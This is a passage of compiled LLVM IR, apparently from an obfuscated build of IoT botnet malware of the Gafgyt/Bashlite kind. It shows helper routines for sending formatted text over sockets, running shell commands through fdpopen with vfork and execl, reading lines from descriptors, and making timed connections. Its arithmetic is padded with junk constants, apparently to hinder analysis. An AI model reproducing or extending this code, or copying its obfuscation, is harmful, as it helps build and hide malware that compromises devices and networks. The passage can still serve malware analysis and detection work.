; <label>:98:                                     ; preds = %109, %97
  %99 = load i32, i32* %7, align 4
  %100 = icmp sgt i32 %99, 0
  br i1 %100, label %101, label %114

; <label>:101:                                    ; preds = %98
  %102 = load i8**, i8*** %5, align 8
  %103 = load i32, i32* %10, align 4
  call void @printchar(i8** %102, i32 %103)
  %104 = load i32, i32* %9, align 4
  %105 = add i32 %104, 1007664330
  %106 = add i32 %105, 1
  %107 = sub i32 %106, 1007664330
  %108 = add nsw i32 %104, 1
  store i32 %107, i32* %9, align 4
  br label %109

; <label>:109:                                    ; preds = %101
  %110 = load i32, i32* %7, align 4
  %111 = sub i32 0, -1
  %112 = sub i32 %110, %111
  %113 = add nsw i32 %110, -1
  store i32 %112, i32* %7, align 4
  br label %98

; <label>:114:                                    ; preds = %98
  %115 = load i32, i32* %9, align 4
  ret i32 %115
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %135

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %48

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %48

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %48

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = add i32 0, -1170258617
  %45 = sub i32 %44, %43
  %46 = sub i32 %45, -1170258617
  %47 = sub nsw i32 0, %43
  store i32 %46, i32* %21, align 4
  br label %48

; <label>:48:                                     ; preds = %42, %39, %36, %33
  %49 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %50 = getelementptr inbounds i8, i8* %49, i64 12
  %51 = getelementptr inbounds i8, i8* %50, i64 -1
  store i8* %51, i8** %17, align 8
  %52 = load i8*, i8** %17, align 8
  store i8 0, i8* %52, align 1
  br label %53

; <label>:53:                                     ; preds = %78, %48
  %54 = load i32, i32* %21, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %56, label %90

; <label>:56:                                     ; preds = %53
  %57 = load i32, i32* %21, align 4
  %58 = load i32, i32* %11, align 4
  %59 = urem i32 %57, %58
  store i32 %59, i32* %18, align 4
  %60 = load i32, i32* %18, align 4
  %61 = icmp sge i32 %60, 10
  br i1 %61, label %62, label %78

; <label>:62:                                     ; preds = %56
  %63 = load i32, i32* %15, align 4
  %64 = add i32 %63, 561027860
  %65 = sub i32 %64, 48
  %66 = sub i32 %65, 561027860
  %67 = sub nsw i32 %63, 48
  %68 = sub i32 %66, 1020201013
  %69 = sub i32 %68, 10
  %70 = add i32 %69, 1020201013
  %71 = sub nsw i32 %66, 10
  %72 = load i32, i32* %18, align 4
  %73 = sub i32 0, %72
  %74 = sub i32 0, %70
  %75 = add i32 %73, %74
  %76 = sub i32 0, %75
  %77 = add nsw i32 %72, %70
  store i32 %76, i32* %18, align 4
  br label %78

; <label>:78:                                     ; preds = %62, %56
  %79 = load i32, i32* %18, align 4
  %80 = add i32 %79, -893700099
  %81 = add i32 %80, 48
  %82 = sub i32 %81, -893700099
  %83 = add nsw i32 %79, 48
  %84 = trunc i32 %82 to i8
  %85 = load i8*, i8** %17, align 8
  %86 = getelementptr inbounds i8, i8* %85, i32 -1
  store i8* %86, i8** %17, align 8
  store i8 %84, i8* %86, align 1
  %87 = load i32, i32* %11, align 4
  %88 = load i32, i32* %21, align 4
  %89 = udiv i32 %88, %87
  store i32 %89, i32* %21, align 4
  br label %53

; <label>:90:                                     ; preds = %53
  %91 = load i32, i32* %19, align 4
  %92 = icmp ne i32 %91, 0
  br i1 %92, label %93, label %123

; <label>:93:                                     ; preds = %90
  %94 = load i32, i32* %13, align 4
  %95 = icmp ne i32 %94, 0
  br i1 %95, label %96, label %119

; <label>:96:                                     ; preds = %93
  %97 = load i32, i32* %14, align 4
  %98 = xor i32 %97, -1
  %99 = xor i32 2, -1
  %100 = xor i32 1267241307, -1
  %101 = or i32 %98, %99
  %102 = or i32 1267241307, %100
  %103 = xor i32 %101, -1
  %104 = and i32 %103, %102
  %105 = and i32 %97, 2
  %106 = icmp ne i32 %104, 0
  br i1 %106, label %107, label %119

; <label>:107:                                    ; preds = %96
  %108 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %108, i32 45)
  %109 = load i32, i32* %20, align 4
  %110 = add i32 %109, -1459095006
  %111 = add i32 %110, 1
  %112 = sub i32 %111, -1459095006
  %113 = add nsw i32 %109, 1
  store i32 %112, i32* %20, align 4
  %114 = load i32, i32* %13, align 4
  %115 = sub i32 %114, 334113901
  %116 = add i32 %115, -1
  %117 = add i32 %116, 334113901
  %118 = add nsw i32 %114, -1
  store i32 %117, i32* %13, align 4
  br label %122

; <label>:119:                                    ; preds = %96, %93
  %120 = load i8*, i8** %17, align 8
  %121 = getelementptr inbounds i8, i8* %120, i32 -1
  store i8* %121, i8** %17, align 8
  store i8 45, i8* %121, align 1
  br label %122

; <label>:122:                                    ; preds = %119, %107
  br label %123

; <label>:123:                                    ; preds = %122, %90
  %124 = load i32, i32* %20, align 4
  %125 = load i8**, i8*** %9, align 8
  %126 = load i8*, i8** %17, align 8
  %127 = load i32, i32* %13, align 4
  %128 = load i32, i32* %14, align 4
  %129 = call i32 @prints(i8** %125, i8* %126, i32 %127, i32 %128)
  %130 = sub i32 0, %124
  %131 = sub i32 0, %129
  %132 = add i32 %130, %131
  %133 = sub i32 0, %132
  %134 = add nsw i32 %124, %129
  store i32 %133, i32* %8, align 4
  br label %135

; <label>:135:                                    ; preds = %123, %25
  %136 = load i32, i32* %8, align 4
  ret i32 %136
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #10
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #2
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

; <label>:14:                                     ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

; <label>:19:                                     ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

; <label>:25:                                     ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:26:                                     ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %28 = call i32 @pipe(i32* %27) #2
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

; <label>:30:                                     ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:31:                                     ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

; <label>:34:                                     ; preds = %31
  %35 = call i32 @getdtablesize() #2
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %34
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:38:                                     ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias i8* @malloc(i64 %43) #2
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:48:                                     ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 %53, i32 1, i1 false)
  br label %54

; <label>:54:                                     ; preds = %48, %31
  %55 = call i32 @vfork() #11
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %101 [
    i32 -1, label %56
    i32 0, label %63
  ]

; <label>:56:                                     ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @close(i32 %61)
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:63:                                     ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

; <label>:68:                                     ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

; <label>:72:                                     ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 %74, i32 1) #2
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 %77)
  br label %79

; <label>:79:                                     ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 %81)
  br label %98

; <label>:83:                                     ; preds = %63
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

; <label>:87:                                     ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 %89, i32 0) #2
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 %92)
  br label %94

; <label>:94:                                     ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 %96)
  br label %98

; <label>:98:                                     ; preds = %94, %79
  %99 = load i8*, i8** %4, align 8
  %100 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i32 0, i32 0), i8* %99, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

; <label>:101:                                    ; preds = %54
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 114
  br i1 %105, label %106, label %112

; <label>:106:                                    ; preds = %101
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %108 = load i32, i32* %107, align 4
  store i32 %108, i32* %6, align 4
  %109 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @close(i32 %110)
  br label %118

; <label>:112:                                    ; preds = %101
  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %114 = load i32, i32* %113, align 4
  store i32 %114, i32* %6, align 4
  %115 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @close(i32 %116)
  br label %118

; <label>:118:                                    ; preds = %112, %106
  %119 = load i32, i32* %9, align 4
  %120 = load i32*, i32** @fdopen_pids, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  store i32 %119, i32* %123, align 4
  %124 = load i32, i32* %6, align 4
  store i32 %124, i32* %3, align 4
  br label %125

; <label>:125:                                    ; preds = %118, %56, %47, %37, %30, %25
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %12, %1
  store i32 -1, i32* %2, align 4
  br label %65

; <label>:20:                                     ; preds = %12
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @close(i32 %21)
  %23 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %27 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  br label %28

; <label>:28:                                     ; preds = %42, %20
  %29 = load i32*, i32** @fdopen_pids, align 8
  %30 = load i32, i32* %3, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i32, i32* %29, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = call i32 @waitpid(i32 %33, i32* %7, i32 0)
  store i32 %34, i32* %8, align 4
  br label %35

; <label>:35:                                     ; preds = %28
  %36 = load i32, i32* %8, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %42

; <label>:38:                                     ; preds = %35
  %39 = call i32* @__errno_location() #13
  %40 = load i32, i32* %39, align 4
  %41 = icmp eq i32 %40, 4
  br label %42

; <label>:42:                                     ; preds = %38, %35
  %43 = phi i1 [ false, %35 ], [ %41, %38 ]
  br i1 %43, label %28, label %44

; <label>:44:                                     ; preds = %42
  %45 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %46 = load i32*, i32** @fdopen_pids, align 8
  %47 = load i32, i32* %4, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds i32, i32* %46, i64 %48
  store i32 0, i32* %49, align 4
  %50 = load i32, i32* %8, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %44
  br label %63

; <label>:53:                                     ; preds = %44
  %54 = bitcast %struct.in_addr* %9 to i32*
  %55 = load i32, i32* %7, align 4
  store i32 %55, i32* %54, align 4
  %56 = bitcast %struct.in_addr* %9 to i32*
  %57 = load i32, i32* %56, align 4
  %58 = xor i32 65280, -1
  %59 = xor i32 %57, %58
  %60 = and i32 %59, %57
  %61 = and i32 %57, 65280
  %62 = ashr i32 %60, 8
  br label %63

; <label>:63:                                     ; preds = %53, %52
  %64 = phi i32 [ -1, %52 ], [ %62, %53 ]
  store i32 %64, i32* %2, align 4
  br label %65

; <label>:65:                                     ; preds = %63, %19
  %66 = load i32, i32* %2, align 4
  ret i32 %66
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %41

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = sub i32 0, %35
  %37 = sub i32 0, 1
  %38 = add i32 %36, %37
  %39 = sub i32 0, %38
  %40 = add nsw i32 %35, 1
  store i32 %39, i32* %8, align 4
  br label %9

; <label>:41:                                     ; preds = %25
  %42 = load i32, i32* %7, align 4
  %43 = icmp eq i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %41
  br label %47

; <label>:45:                                     ; preds = %41
  %46 = load i8*, i8** %4, align 8
  br label %47

; <label>:47:                                     ; preds = %45, %44
  %48 = phi i8* [ null, %44 ], [ %46, %45 ]
  ret i8* %48
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = and i64 %22, 2048
  %24 = xor i64 %22, 2048
  %25 = or i64 %23, %24
  %26 = or i64 %22, 2048
  store i64 %25, i64* %15, align 8
  %27 = load i32, i32* %6, align 4
  %28 = load i64, i64* %15, align 8
  %29 = call i32 (i32, i32, ...) @fcntl(i32 %27, i32 4, i64 %28)
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %30, align 4
  %31 = load i32, i32* %8, align 4
  %32 = trunc i32 %31 to i16
  %33 = call zeroext i16 @htons(i16 zeroext %32) #13
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  %35 = load i8*, i8** %7, align 8
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %37 = call i32 @getHost(i8* %35, %struct.in_addr* %36)
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %39, label %40

; <label>:39:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %124

; <label>:40:                                     ; preds = %4
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %42 = getelementptr inbounds [8 x i8], [8 x i8]* %41, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %42, i8 0, i64 8, i32 4, i1 false)
  %43 = load i32, i32* %6, align 4
  %44 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %45 = call i32 @connect(i32 %43, %struct.sockaddr* %44, i32 16)
  store i32 %45, i32* %16, align 4
  %46 = load i32, i32* %16, align 4
  %47 = icmp slt i32 %46, 0
  br i1 %47, label %48, label %112

; <label>:48:                                     ; preds = %40
  %49 = call i32* @__errno_location() #13
  %50 = load i32, i32* %49, align 4
  %51 = icmp eq i32 %50, 115
  br i1 %51, label %52, label %110

; <label>:52:                                     ; preds = %48
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %54, i64* %55, align 8
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %56, align 8
  br label %57

; <label>:57:                                     ; preds = %52
  %58 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %59 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 0
  %60 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %59) #2, !srcloc !1
  %61 = extractvalue { i64, i64* } %60, 0
  %62 = extractvalue { i64, i64* } %60, 1
  %63 = trunc i64 %61 to i32
  store i32 %63, i32* %17, align 4
  %64 = ptrtoint i64* %62 to i64
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %18, align 4
  br label %66

; <label>:66:                                     ; preds = %57
  %67 = load i32, i32* %6, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %72 = load i32, i32* %6, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = xor i64 %76, -1
  %78 = xor i64 %70, -1
  %79 = xor i64 5269864036901865016, -1
  %80 = and i64 %77, 5269864036901865016
  %81 = and i64 %76, %79
  %82 = and i64 %78, 5269864036901865016
  %83 = and i64 %70, %79
  %84 = or i64 %80, %81
  %85 = or i64 %82, %83
  %86 = xor i64 %84, %85
